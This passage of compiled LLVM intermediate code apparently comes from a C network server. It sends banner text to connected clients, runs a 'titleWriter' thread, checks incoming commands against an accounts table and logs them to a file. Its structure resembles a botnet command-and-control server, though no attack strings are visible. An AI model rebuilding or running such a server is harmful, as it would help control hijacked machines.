  br i1 %1853, label %1854, label %1855

1854:                                             ; preds = %1847
  br label %2807

1855:                                             ; preds = %1847
  %1856 = load i32, i32* %4, align 4
  %1857 = getelementptr inbounds [5000 x i8], [5000 x i8]* %138, i64 0, i64 0
  %1858 = getelementptr inbounds [5000 x i8], [5000 x i8]* %138, i64 0, i64 0
  %1859 = call i64 @strlen(i8* %1858) #9
  %1860 = call i64 @send(i32 %1856, i8* %1857, i64 %1859, i32 16384)
  %1861 = icmp eq i64 %1860, -1
  br i1 %1861, label %1862, label %1863

1862:                                             ; preds = %1855
  br label %2807

1863:                                             ; preds = %1855
  %1864 = load i32, i32* %4, align 4
  %1865 = getelementptr inbounds [5000 x i8], [5000 x i8]* %139, i64 0, i64 0
  %1866 = getelementptr inbounds [5000 x i8], [5000 x i8]* %139, i64 0, i64 0
  %1867 = call i64 @strlen(i8* %1866) #9
  %1868 = call i64 @send(i32 %1864, i8* %1865, i64 %1867, i32 16384)
  %1869 = icmp eq i64 %1868, -1
  br i1 %1869, label %1870, label %1871

1870:                                             ; preds = %1863
  br label %2807

1871:                                             ; preds = %1863
  %1872 = load i32, i32* %4, align 4
  %1873 = getelementptr inbounds [5000 x i8], [5000 x i8]* %140, i64 0, i64 0
  %1874 = getelementptr inbounds [5000 x i8], [5000 x i8]* %140, i64 0, i64 0
  %1875 = call i64 @strlen(i8* %1874) #9
  %1876 = call i64 @send(i32 %1872, i8* %1873, i64 %1875, i32 16384)
  %1877 = icmp eq i64 %1876, -1
  br i1 %1877, label %1878, label %1879

1878:                                             ; preds = %1871
  br label %2807

1879:                                             ; preds = %1871
  %1880 = load i32, i32* %4, align 4
  %1881 = getelementptr inbounds [5000 x i8], [5000 x i8]* %141, i64 0, i64 0
  %1882 = getelementptr inbounds [5000 x i8], [5000 x i8]* %141, i64 0, i64 0
  %1883 = call i64 @strlen(i8* %1882) #9
  %1884 = call i64 @send(i32 %1880, i8* %1881, i64 %1883, i32 16384)
  %1885 = icmp eq i64 %1884, -1
  br i1 %1885, label %1886, label %1887

1886:                                             ; preds = %1879
  br label %2807

1887:                                             ; preds = %1879
  %1888 = load i32, i32* %4, align 4
  %1889 = getelementptr inbounds [5000 x i8], [5000 x i8]* %142, i64 0, i64 0
  %1890 = getelementptr inbounds [5000 x i8], [5000 x i8]* %142, i64 0, i64 0
  %1891 = call i64 @strlen(i8* %1890) #9
  %1892 = call i64 @send(i32 %1888, i8* %1889, i64 %1891, i32 16384)
  %1893 = icmp eq i64 %1892, -1
  br i1 %1893, label %1894, label %1895

1894:                                             ; preds = %1887
  br label %2807

1895:                                             ; preds = %1887
  %1896 = load i32, i32* %4, align 4
  %1897 = getelementptr inbounds [5000 x i8], [5000 x i8]* %143, i64 0, i64 0
  %1898 = getelementptr inbounds [5000 x i8], [5000 x i8]* %143, i64 0, i64 0
  %1899 = call i64 @strlen(i8* %1898) #9
  %1900 = call i64 @send(i32 %1896, i8* %1897, i64 %1899, i32 16384)
  %1901 = icmp eq i64 %1900, -1
  br i1 %1901, label %1902, label %1903

1902:                                             ; preds = %1895
  br label %2807

1903:                                             ; preds = %1895
  %1904 = load i32, i32* %4, align 4
  %1905 = getelementptr inbounds [5000 x i8], [5000 x i8]* %144, i64 0, i64 0
  %1906 = getelementptr inbounds [5000 x i8], [5000 x i8]* %144, i64 0, i64 0
  %1907 = call i64 @strlen(i8* %1906) #9
  %1908 = call i64 @send(i32 %1904, i8* %1905, i64 %1907, i32 16384)
  %1909 = icmp eq i64 %1908, -1
  br i1 %1909, label %1910, label %1911

1910:                                             ; preds = %1903
  br label %2807

1911:                                             ; preds = %1903
  %1912 = load i32, i32* %4, align 4
  %1913 = getelementptr inbounds [5000 x i8], [5000 x i8]* %145, i64 0, i64 0
  %1914 = getelementptr inbounds [5000 x i8], [5000 x i8]* %145, i64 0, i64 0
  %1915 = call i64 @strlen(i8* %1914) #9
  %1916 = call i64 @send(i32 %1912, i8* %1913, i64 %1915, i32 16384)
  %1917 = icmp eq i64 %1916, -1
  br i1 %1917, label %1918, label %1919

1918:                                             ; preds = %1911
  br label %2807

1919:                                             ; preds = %1911
  %1920 = load i32, i32* %4, align 4
  %1921 = getelementptr inbounds [5000 x i8], [5000 x i8]* %146, i64 0, i64 0
  %1922 = getelementptr inbounds [5000 x i8], [5000 x i8]* %146, i64 0, i64 0
  %1923 = call i64 @strlen(i8* %1922) #9
  %1924 = call i64 @send(i32 %1920, i8* %1921, i64 %1923, i32 16384)
  %1925 = icmp eq i64 %1924, -1
  br i1 %1925, label %1926, label %1927

1926:                                             ; preds = %1919
  br label %2807

1927:                                             ; preds = %1919
  %1928 = load i32, i32* %4, align 4
  %1929 = getelementptr inbounds [5000 x i8], [5000 x i8]* %147, i64 0, i64 0
  %1930 = getelementptr inbounds [5000 x i8], [5000 x i8]* %147, i64 0, i64 0
  %1931 = call i64 @strlen(i8* %1930) #9
  %1932 = call i64 @send(i32 %1928, i8* %1929, i64 %1931, i32 16384)
  %1933 = icmp eq i64 %1932, -1
  br i1 %1933, label %1934, label %1935

1934:                                             ; preds = %1927
  br label %2807

1935:                                             ; preds = %1927
  %1936 = load i32, i32* %4, align 4
  %1937 = getelementptr inbounds [5000 x i8], [5000 x i8]* %148, i64 0, i64 0
  %1938 = getelementptr inbounds [5000 x i8], [5000 x i8]* %148, i64 0, i64 0
  %1939 = call i64 @strlen(i8* %1938) #9
  %1940 = call i64 @send(i32 %1936, i8* %1937, i64 %1939, i32 16384)
  %1941 = icmp eq i64 %1940, -1
  br i1 %1941, label %1942, label %1943

1942:                                             ; preds = %1935
  br label %2807

1943:                                             ; preds = %1935
  %1944 = load i32, i32* %4, align 4
  %1945 = getelementptr inbounds [5000 x i8], [5000 x i8]* %149, i64 0, i64 0
  %1946 = getelementptr inbounds [5000 x i8], [5000 x i8]* %149, i64 0, i64 0
  %1947 = call i64 @strlen(i8* %1946) #9
  %1948 = call i64 @send(i32 %1944, i8* %1945, i64 %1947, i32 16384)
  %1949 = icmp eq i64 %1948, -1
  br i1 %1949, label %1950, label %1951

1950:                                             ; preds = %1943
  br label %2807

1951:                                             ; preds = %1943
  %1952 = load i32, i32* %4, align 4
  %1953 = getelementptr inbounds [5000 x i8], [5000 x i8]* %150, i64 0, i64 0
  %1954 = getelementptr inbounds [5000 x i8], [5000 x i8]* %150, i64 0, i64 0
  %1955 = call i64 @strlen(i8* %1954) #9
  %1956 = call i64 @send(i32 %1952, i8* %1953, i64 %1955, i32 16384)
  %1957 = icmp eq i64 %1956, -1
  br i1 %1957, label %1958, label %1959

1958:                                             ; preds = %1951
  br label %2807

1959:                                             ; preds = %1951
  %1960 = load i32, i32* %4, align 4
  %1961 = getelementptr inbounds [5000 x i8], [5000 x i8]* %151, i64 0, i64 0
  %1962 = getelementptr inbounds [5000 x i8], [5000 x i8]* %151, i64 0, i64 0
  %1963 = call i64 @strlen(i8* %1962) #9
  %1964 = call i64 @send(i32 %1960, i8* %1961, i64 %1963, i32 16384)
  %1965 = icmp eq i64 %1964, -1
  br i1 %1965, label %1966, label %1967

1966:                                             ; preds = %1959
  br label %2807

1967:                                             ; preds = %1959
  %1968 = load i32, i32* %4, align 4
  %1969 = getelementptr inbounds [5000 x i8], [5000 x i8]* %152, i64 0, i64 0
  %1970 = getelementptr inbounds [5000 x i8], [5000 x i8]* %152, i64 0, i64 0
  %1971 = call i64 @strlen(i8* %1970) #9
  %1972 = call i64 @send(i32 %1968, i8* %1969, i64 %1971, i32 16384)
  %1973 = icmp eq i64 %1972, -1
  br i1 %1973, label %1974, label %1975

1974:                                             ; preds = %1967
  br label %2807

1975:                                             ; preds = %1967
  %1976 = load i32, i32* %4, align 4
  %1977 = getelementptr inbounds [5000 x i8], [5000 x i8]* %153, i64 0, i64 0
  %1978 = getelementptr inbounds [5000 x i8], [5000 x i8]* %153, i64 0, i64 0
  %1979 = call i64 @strlen(i8* %1978) #9
  %1980 = call i64 @send(i32 %1976, i8* %1977, i64 %1979, i32 16384)
  %1981 = icmp eq i64 %1980, -1
  br i1 %1981, label %1982, label %1983

1982:                                             ; preds = %1975
  br label %2807

1983:                                             ; preds = %1975
  %1984 = load i32, i32* %4, align 4
  %1985 = getelementptr inbounds [5000 x i8], [5000 x i8]* %154, i64 0, i64 0
  %1986 = getelementptr inbounds [5000 x i8], [5000 x i8]* %154, i64 0, i64 0
  %1987 = call i64 @strlen(i8* %1986) #9
  %1988 = call i64 @send(i32 %1984, i8* %1985, i64 %1987, i32 16384)
  %1989 = icmp eq i64 %1988, -1
  br i1 %1989, label %1990, label %1991

1990:                                             ; preds = %1983
  br label %2807

1991:                                             ; preds = %1983
  %1992 = load i32, i32* %4, align 4
  %1993 = getelementptr inbounds [5000 x i8], [5000 x i8]* %155, i64 0, i64 0
  %1994 = getelementptr inbounds [5000 x i8], [5000 x i8]* %155, i64 0, i64 0
  %1995 = call i64 @strlen(i8* %1994) #9
  %1996 = call i64 @send(i32 %1992, i8* %1993, i64 %1995, i32 16384)
  %1997 = icmp eq i64 %1996, -1
  br i1 %1997, label %1998, label %1999

1998:                                             ; preds = %1991
  br label %2807

1999:                                             ; preds = %1991
  %2000 = load i32, i32* %4, align 4
  %2001 = getelementptr inbounds [5000 x i8], [5000 x i8]* %156, i64 0, i64 0
  %2002 = getelementptr inbounds [5000 x i8], [5000 x i8]* %156, i64 0, i64 0
  %2003 = call i64 @strlen(i8* %2002) #9
  %2004 = call i64 @send(i32 %2000, i8* %2001, i64 %2003, i32 16384)
  %2005 = icmp eq i64 %2004, -1
  br i1 %2005, label %2006, label %2007

2006:                                             ; preds = %1999
  br label %2807

2007:                                             ; preds = %1999
  %2008 = load i32, i32* %4, align 4
  %2009 = getelementptr inbounds [5000 x i8], [5000 x i8]* %157, i64 0, i64 0
  %2010 = getelementptr inbounds [5000 x i8], [5000 x i8]* %157, i64 0, i64 0
  %2011 = call i64 @strlen(i8* %2010) #9
  %2012 = call i64 @send(i32 %2008, i8* %2009, i64 %2011, i32 16384)
  %2013 = icmp eq i64 %2012, -1
  br i1 %2013, label %2014, label %2015

2014:                                             ; preds = %2007
  br label %2807

2015:                                             ; preds = %2007
  %2016 = load i32, i32* %4, align 4
  %2017 = getelementptr inbounds [5000 x i8], [5000 x i8]* %158, i64 0, i64 0
  %2018 = getelementptr inbounds [5000 x i8], [5000 x i8]* %158, i64 0, i64 0
  %2019 = call i64 @strlen(i8* %2018) #9
  %2020 = call i64 @send(i32 %2016, i8* %2017, i64 %2019, i32 16384)
  %2021 = icmp eq i64 %2020, -1
  br i1 %2021, label %2022, label %2023

2022:                                             ; preds = %2015
  br label %2807

2023:                                             ; preds = %2015
  %2024 = load i8*, i8** %3, align 8
  %2025 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %2024) #8
  br label %2026

2026:                                             ; preds = %2023
  %2027 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2028 = load i32, i32* %5, align 4
  %2029 = sext i32 %2028 to i64
  %2030 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2029
  %2031 = getelementptr inbounds %struct.account, %struct.account* %2030, i32 0, i32 0
  %2032 = getelementptr inbounds [200 x i8], [200 x i8]* %2031, i64 0, i64 0
  %2033 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2034 = call i32 (i8*, i8*, ...) @sprintf(i8* %2027, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.40, i64 0, i64 0), i8* %2032, i8* %2033) #8
  %2035 = load i32, i32* %4, align 4
  %2036 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2037 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2038 = call i64 @strlen(i8* %2037) #9
  %2039 = call i64 @send(i32 %2035, i8* %2036, i64 %2038, i32 16384)
  %2040 = icmp eq i64 %2039, -1
  br i1 %2040, label %2041, label %2042

2041:                                             ; preds = %2026
  br label %2807

2042:                                             ; preds = %2026
  br label %2043

2043:                                             ; preds = %2042
  br label %426, !llvm.loop !26

2044:                                             ; preds = %1787
  %2045 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2046 = call i8* @strstr(i8* %2045, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.173, i64 0, i64 0)) #9
  %2047 = icmp ne i8* %2046, null
  br i1 %2047, label %2048, label %2152

2048:                                             ; preds = %2044
  br label %2049

2049:                                             ; preds = %2048
  %2050 = load i8*, i8** %3, align 8
  %2051 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %2050) #8
  %2052 = getelementptr inbounds [5000 x i8], [5000 x i8]* %159, i64 0, i64 0
  %2053 = call i32 (i8*, i8*, ...) @sprintf(i8* %2052, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.174, i64 0, i64 0)) #8
  %2054 = getelementptr inbounds [5000 x i8], [5000 x i8]* %160, i64 0, i64 0
  %2055 = call i32 (i8*, i8*, ...) @sprintf(i8* %2054, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %2056 = getelementptr inbounds [5000 x i8], [5000 x i8]* %161, i64 0, i64 0
  %2057 = call i32 (i8*, i8*, ...) @sprintf(i8* %2056, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.175, i64 0, i64 0)) #8
  %2058 = getelementptr inbounds [5000 x i8], [5000 x i8]* %162, i64 0, i64 0
  %2059 = call i32 (i8*, i8*, ...) @sprintf(i8* %2058, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.176, i64 0, i64 0)) #8
  %2060 = getelementptr inbounds [5000 x i8], [5000 x i8]* %163, i64 0, i64 0
  %2061 = call i32 (i8*, i8*, ...) @sprintf(i8* %2060, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.177, i64 0, i64 0)) #8
  %2062 = getelementptr inbounds [5000 x i8], [5000 x i8]* %164, i64 0, i64 0
  %2063 = call i32 (i8*, i8*, ...) @sprintf(i8* %2062, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.178, i64 0, i64 0)) #8
  %2064 = getelementptr inbounds [5000 x i8], [5000 x i8]* %165, i64 0, i64 0
  %2065 = call i32 (i8*, i8*, ...) @sprintf(i8* %2064, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.179, i64 0, i64 0)) #8
  %2066 = getelementptr inbounds [5000 x i8], [5000 x i8]* %166, i64 0, i64 0
  %2067 = call i32 (i8*, i8*, ...) @sprintf(i8* %2066, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %2068 = load i32, i32* %4, align 4
  %2069 = getelementptr inbounds [5000 x i8], [5000 x i8]* %159, i64 0, i64 0
  %2070 = getelementptr inbounds [5000 x i8], [5000 x i8]* %159, i64 0, i64 0
  %2071 = call i64 @strlen(i8* %2070) #9
  %2072 = call i64 @send(i32 %2068, i8* %2069, i64 %2071, i32 16384)
  %2073 = icmp eq i64 %2072, -1
  br i1 %2073, label %2074, label %2075

2074:                                             ; preds = %2049
  br label %2807

2075:                                             ; preds = %2049
  %2076 = load i32, i32* %4, align 4
  %2077 = getelementptr inbounds [5000 x i8], [5000 x i8]* %160, i64 0, i64 0
  %2078 = getelementptr inbounds [5000 x i8], [5000 x i8]* %160, i64 0, i64 0
  %2079 = call i64 @strlen(i8* %2078) #9
  %2080 = call i64 @send(i32 %2076, i8* %2077, i64 %2079, i32 16384)
  %2081 = icmp eq i64 %2080, -1
  br i1 %2081, label %2082, label %2083

2082:                                             ; preds = %2075
  br label %2807

2083:                                             ; preds = %2075
  %2084 = load i32, i32* %4, align 4
  %2085 = getelementptr inbounds [5000 x i8], [5000 x i8]* %161, i64 0, i64 0
  %2086 = getelementptr inbounds [5000 x i8], [5000 x i8]* %161, i64 0, i64 0
  %2087 = call i64 @strlen(i8* %2086) #9
  %2088 = call i64 @send(i32 %2084, i8* %2085, i64 %2087, i32 16384)
  %2089 = icmp eq i64 %2088, -1
  br i1 %2089, label %2090, label %2091

2090:                                             ; preds = %2083
  br label %2807

2091:                                             ; preds = %2083
  %2092 = load i32, i32* %4, align 4
  %2093 = getelementptr inbounds [5000 x i8], [5000 x i8]* %162, i64 0, i64 0
  %2094 = getelementptr inbounds [5000 x i8], [5000 x i8]* %162, i64 0, i64 0
  %2095 = call i64 @strlen(i8* %2094) #9
  %2096 = call i64 @send(i32 %2092, i8* %2093, i64 %2095, i32 16384)
  %2097 = icmp eq i64 %2096, -1
  br i1 %2097, label %2098, label %2099

2098:                                             ; preds = %2091
  br label %2807

2099:                                             ; preds = %2091
  %2100 = load i32, i32* %4, align 4
  %2101 = getelementptr inbounds [5000 x i8], [5000 x i8]* %163, i64 0, i64 0
  %2102 = getelementptr inbounds [5000 x i8], [5000 x i8]* %163, i64 0, i64 0
  %2103 = call i64 @strlen(i8* %2102) #9
  %2104 = call i64 @send(i32 %2100, i8* %2101, i64 %2103, i32 16384)
  %2105 = icmp eq i64 %2104, -1
  br i1 %2105, label %2106, label %2107

2106:                                             ; preds = %2099
  br label %2807

2107:                                             ; preds = %2099
  %2108 = load i32, i32* %4, align 4
  %2109 = getelementptr inbounds [5000 x i8], [5000 x i8]* %164, i64 0, i64 0
  %2110 = getelementptr inbounds [5000 x i8], [5000 x i8]* %164, i64 0, i64 0
  %2111 = call i64 @strlen(i8* %2110) #9
  %2112 = call i64 @send(i32 %2108, i8* %2109, i64 %2111, i32 16384)
  %2113 = icmp eq i64 %2112, -1
  br i1 %2113, label %2114, label %2115

2114:                                             ; preds = %2107
  br label %2807

2115:                                             ; preds = %2107
  %2116 = load i32, i32* %4, align 4
  %2117 = getelementptr inbounds [5000 x i8], [5000 x i8]* %165, i64 0, i64 0
  %2118 = getelementptr inbounds [5000 x i8], [5000 x i8]* %165, i64 0, i64 0
  %2119 = call i64 @strlen(i8* %2118) #9
  %2120 = call i64 @send(i32 %2116, i8* %2117, i64 %2119, i32 16384)
  %2121 = icmp eq i64 %2120, -1
  br i1 %2121, label %2122, label %2123

2122:                                             ; preds = %2115
  br label %2807

2123:                                             ; preds = %2115
  %2124 = load i32, i32* %4, align 4
  %2125 = getelementptr inbounds [5000 x i8], [5000 x i8]* %166, i64 0, i64 0
  %2126 = getelementptr inbounds [5000 x i8], [5000 x i8]* %166, i64 0, i64 0
  %2127 = call i64 @strlen(i8* %2126) #9
  %2128 = call i64 @send(i32 %2124, i8* %2125, i64 %2127, i32 16384)
  %2129 = icmp eq i64 %2128, -1
  br i1 %2129, label %2130, label %2131

2130:                                             ; preds = %2123
  br label %2807

2131:                                             ; preds = %2123
  %2132 = load i8*, i8** %3, align 8
  %2133 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %2132) #8
  br label %2134

2134:                                             ; preds = %2131
  %2135 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2136 = load i32, i32* %5, align 4
  %2137 = sext i32 %2136 to i64
  %2138 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2137
  %2139 = getelementptr inbounds %struct.account, %struct.account* %2138, i32 0, i32 0
  %2140 = getelementptr inbounds [200 x i8], [200 x i8]* %2139, i64 0, i64 0
  %2141 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2142 = call i32 (i8*, i8*, ...) @sprintf(i8* %2135, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.40, i64 0, i64 0), i8* %2140, i8* %2141) #8
  %2143 = load i32, i32* %4, align 4
  %2144 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2145 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2146 = call i64 @strlen(i8* %2145) #9
  %2147 = call i64 @send(i32 %2143, i8* %2144, i64 %2146, i32 16384)
  %2148 = icmp eq i64 %2147, -1
  br i1 %2148, label %2149, label %2150

2149:                                             ; preds = %2134
  br label %2807

2150:                                             ; preds = %2134
  br label %2151

2151:                                             ; preds = %2150
  br label %426, !llvm.loop !26

2152:                                             ; preds = %2044
  %2153 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2154 = call i8* @strstr(i8* %2153, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.180, i64 0, i64 0)) #9
  %2155 = icmp ne i8* %2154, null
  br i1 %2155, label %2156, label %2167

2156:                                             ; preds = %2152
  %2157 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2158 = call i32 (i8*, i8*, ...) @sprintf(i8* %2157, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.181, i64 0, i64 0)) #8
  %2159 = load i32, i32* %4, align 4
  %2160 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2161 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2162 = call i64 @strlen(i8* %2161) #9
  %2163 = call i64 @send(i32 %2159, i8* %2160, i64 %2162, i32 16384)
  %2164 = icmp eq i64 %2163, -1
  br i1 %2164, label %2165, label %2166

2165:                                             ; preds = %2156
  store i8* null, i8** %2, align 8
  br label %2816

2166:                                             ; preds = %2156
  br label %2167

2167:                                             ; preds = %2166, %2152
  %2168 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2169 = call i8* @strstr(i8* %2168, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i64 0, i64 0)) #9
  %2170 = icmp ne i8* %2169, null
  br i1 %2170, label %2171, label %2182

2171:                                             ; preds = %2167
  %2172 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2173 = call i32 (i8*, i8*, ...) @sprintf(i8* %2172, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.183, i64 0, i64 0)) #8
  %2174 = load i32, i32* %4, align 4
  %2175 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2176 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2177 = call i64 @strlen(i8* %2176) #9
  %2178 = call i64 @send(i32 %2174, i8* %2175, i64 %2177, i32 16384)
  %2179 = icmp eq i64 %2178, -1
  br i1 %2179, label %2180, label %2181

2180:                                             ; preds = %2171
  store i8* null, i8** %2, align 8
  br label %2816

2181:                                             ; preds = %2171
  br label %2182

2182:                                             ; preds = %2181, %2167
  %2183 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2184 = call i8* @strstr(i8* %2183, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.184, i64 0, i64 0)) #9
  %2185 = icmp ne i8* %2184, null
  br i1 %2185, label %2186, label %2197

2186:                                             ; preds = %2182
  %2187 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2188 = call i32 (i8*, i8*, ...) @sprintf(i8* %2187, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.185, i64 0, i64 0)) #8
  %2189 = load i32, i32* %4, align 4
  %2190 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2191 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2192 = call i64 @strlen(i8* %2191) #9
  %2193 = call i64 @send(i32 %2189, i8* %2190, i64 %2192, i32 16384)
  %2194 = icmp eq i64 %2193, -1
  br i1 %2194, label %2195, label %2196

2195:                                             ; preds = %2186
  store i8* null, i8** %2, align 8
  br label %2816

2196:                                             ; preds = %2186
  br label %2197

2197:                                             ; preds = %2196, %2182
  %2198 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2199 = call i8* @strstr(i8* %2198, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.186, i64 0, i64 0)) #9
  %2200 = icmp ne i8* %2199, null
  br i1 %2200, label %2201, label %2212

2201:                                             ; preds = %2197
  %2202 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2203 = call i32 (i8*, i8*, ...) @sprintf(i8* %2202, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.187, i64 0, i64 0)) #8
  %2204 = load i32, i32* %4, align 4
  %2205 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2206 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2207 = call i64 @strlen(i8* %2206) #9
  %2208 = call i64 @send(i32 %2204, i8* %2205, i64 %2207, i32 16384)
  %2209 = icmp eq i64 %2208, -1
  br i1 %2209, label %2210, label %2211

2210:                                             ; preds = %2201
  store i8* null, i8** %2, align 8
  br label %2816

2211:                                             ; preds = %2201
  br label %2212

2212:                                             ; preds = %2211, %2197
  %2213 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2214 = call i8* @strstr(i8* %2213, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.188, i64 0, i64 0)) #9
  %2215 = icmp ne i8* %2214, null
  br i1 %2215, label %2216, label %2227

2216:                                             ; preds = %2212
  %2217 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2218 = call i32 (i8*, i8*, ...) @sprintf(i8* %2217, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.189, i64 0, i64 0)) #8
  %2219 = load i32, i32* %4, align 4
  %2220 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2221 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2222 = call i64 @strlen(i8* %2221) #9
  %2223 = call i64 @send(i32 %2219, i8* %2220, i64 %2222, i32 16384)
  %2224 = icmp eq i64 %2223, -1
  br i1 %2224, label %2225, label %2226

2225:                                             ; preds = %2216
  store i8* null, i8** %2, align 8
  br label %2816

2226:                                             ; preds = %2216
  br label %2227

2227:                                             ; preds = %2226, %2212
  %2228 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2229 = call i8* @strstr(i8* %2228, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.190, i64 0, i64 0)) #9
  %2230 = icmp ne i8* %2229, null
  br i1 %2230, label %2231, label %2250

2231:                                             ; preds = %2227
  %2232 = load i32, i32* %5, align 4
  %2233 = sext i32 %2232 to i64
  %2234 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2233
  %2235 = getelementptr inbounds %struct.account, %struct.account* %2234, i32 0, i32 0
  %2236 = getelementptr inbounds [200 x i8], [200 x i8]* %2235, i64 0, i64 0
  %2237 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2238 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.191, i64 0, i64 0), i8* %2236, i8* %2237)
  %2239 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.192, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i64 0, i64 0))
  store %struct._IO_FILE* %2239, %struct._IO_FILE** %167, align 8
  %2240 = load %struct._IO_FILE*, %struct._IO_FILE** %167, align 8
  %2241 = load i32, i32* %5, align 4
  %2242 = sext i32 %2241 to i64
  %2243 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2242
  %2244 = getelementptr inbounds %struct.account, %struct.account* %2243, i32 0, i32 0
  %2245 = getelementptr inbounds [200 x i8], [200 x i8]* %2244, i64 0, i64 0
  %2246 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2247 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2240, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.191, i64 0, i64 0), i8* %2245, i8* %2246)
  %2248 = load %struct._IO_FILE*, %struct._IO_FILE** %167, align 8
  %2249 = call i32 @fclose(%struct._IO_FILE* %2248)
  br label %2807

2250:                                             ; preds = %2227
  %2251 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2252 = call i8* @strstr(i8* %2251, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.193, i64 0, i64 0)) #9
  %2253 = icmp ne i8* %2252, null
  br i1 %2253, label %2254, label %2273

2254:                                             ; preds = %2250
  %2255 = load i32, i32* %5, align 4
  %2256 = sext i32 %2255 to i64
  %2257 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2256
  %2258 = getelementptr inbounds %struct.account, %struct.account* %2257, i32 0, i32 0
  %2259 = getelementptr inbounds [200 x i8], [200 x i8]* %2258, i64 0, i64 0
  %2260 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2261 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.191, i64 0, i64 0), i8* %2259, i8* %2260)
  %2262 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.192, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i64 0, i64 0))
  store %struct._IO_FILE* %2262, %struct._IO_FILE** %168, align 8
  %2263 = load %struct._IO_FILE*, %struct._IO_FILE** %168, align 8
  %2264 = load i32, i32* %5, align 4
  %2265 = sext i32 %2264 to i64
